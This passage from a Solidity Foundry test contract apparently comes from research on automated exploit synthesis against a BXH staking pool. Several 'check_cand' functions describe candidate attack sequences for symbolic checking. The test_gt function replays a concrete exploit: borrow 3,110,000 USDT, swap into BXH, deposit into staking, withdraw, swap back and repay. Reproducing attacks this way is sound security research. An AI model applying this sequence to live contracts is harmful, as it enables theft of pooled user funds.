        deposit_bxhstaking_bxh_bxhslp(amt1);
        swap_pair_attacker_bxh_usdt(amt2, amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt8 >= amt6);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        borrow_usdt_pair(amt6);
        withdraw_bxhstaking_bxhslp_usdt(amt7);
        payback_usdt_pair(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt8 >= amt6);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        borrow_bxh_pair(amt6);
        withdraw_bxhstaking_bxhslp_usdt(amt7);
        payback_bxh_pair(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        swap_pair_attacker_usdt_bxh(amt6, amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        swap_pair_attacker_bxh_usdt(amt6, amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 3110000e18);
        borrow_usdt_owner(3110000e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 3110000e18);
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(3110000e18, address(usdt))
        );
        swap_pair_attacker_usdt_bxh(
            3110000e18,
            pair.getAmountOut(3110000e18, address(usdt))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", 5582e18);
        deposit_bxhstaking_bxh_bxhslp(5582e18);
        printBalance("After step2 ");
        emit log_named_uint("amt4", 0);
        withdraw_bxhstaking_bxhslp_usdt(0);
        printBalance("After step3 ");
        emit log_named_uint("amt5", bxh.balanceOf(attacker));
        emit log_named_uint(
            "amt6",
            pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
        );
        swap_pair_attacker_bxh_usdt(
            bxh.balanceOf(attacker),
            pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
        );
        printBalance("After step4 ");
        emit log_named_uint("amt7", (3110000e18 * 1003) / 1000);
        payback_usdt_owner((3110000e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_bxh_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
